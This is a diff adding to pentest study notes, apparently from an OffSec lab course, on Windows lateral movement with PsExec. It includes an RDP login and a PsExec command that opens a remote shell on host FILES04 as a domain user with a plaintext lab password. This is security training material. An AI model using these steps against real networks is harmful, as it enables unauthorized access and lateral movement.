@@ -3,7 +3,6 @@ Kerberos and NTLM do not use the clear text password directly, and native tools 
 
 ## WMI and WinRM
 
-
 ### WMI
 *Windows Management Instrumentation*
 - An object-oriented feature that facilitates task automation
@@ -183,3 +182,51 @@ Enter-PSSession 1
 		
 		Access is denied.
 ```
+
+
+## psexec
+- Replacement for telnet-like applications and provide remote execution of processes on other systems through an interactive console
+- Part of the SysInternals suite
+	- Not installed by default, but easily transferable
+- Can be misused for lateral movement
+	- User authenticating to target must be part of Admins local group
+	- ADMIN$ share must be available                         -> Default on Win Server
+	- File and Printer Sharing must be turned on         -> Default on Win Server
+
+
+To execute the command remotely, PsExec performs the following tasks:
+- Writes **psexesvc.exe** into the **C:\Windows** directory
+- Creates and spawns a service on the remote host
+- Runs the requested program/command as a child process of **psexesvc.exe**
+
+##### Scenario
+
+- RDP access as local Admin user `offsec` on client74
+```bash
+xfreerdp /cert-ignore /u:offsec /p:lab /v:192.168.220.74
+```
+	- NOTE: no `/d` flag is used as it's the local Admin user, not a domain user.
+
+- Invoke an interactive (`-i`) session on the remote host
+```powershell
+powershell.exe
+cd C:\Tools\SysinternalsSuite
+
+.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
+	PsExec v2.4 - Execute processes remotely
+	Copyright (C) 2001-2022 Mark Russinovich
+	Sysinternals - www.sysinternals.com
+
+	Microsoft Windows [Version 10.0.20348.169]
+	(c) Microsoft Corporation. All rights reserved.
+	
+	C:\Windows\system32>hostname
+		FILES04
+	
+	C:\Windows\system32>whoami
+		corp\jen
+```
+
+
+## AD Pass-The-Hash
+
